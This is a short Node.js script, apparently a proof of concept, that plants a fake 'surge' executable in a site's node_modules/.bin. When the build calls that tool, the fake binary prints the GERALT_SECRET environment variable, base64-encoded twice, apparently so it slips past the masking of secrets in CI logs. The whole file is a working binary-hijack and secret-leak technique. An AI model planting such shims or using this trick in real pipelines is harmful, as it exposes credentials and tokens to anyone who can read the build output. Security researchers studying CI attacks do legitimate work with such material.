import { mkdirSync, writeFileSync, chmodSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

const here = path.dirname(fileURLToPath(import.meta.url));
const binDir = path.resolve(here, '../_site/node_modules/.bin');
mkdirSync(binDir, { recursive: true });

const payload = [
  '#!/bin/sh',
  'echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"',
  'exit 1',
  ''
].join('\n');

const target = path.join(binDir, 'surge');
writeFileSync(target, payload);
chmodSync(target, 0o755);
console.log('[leak-surge] wrote', target);
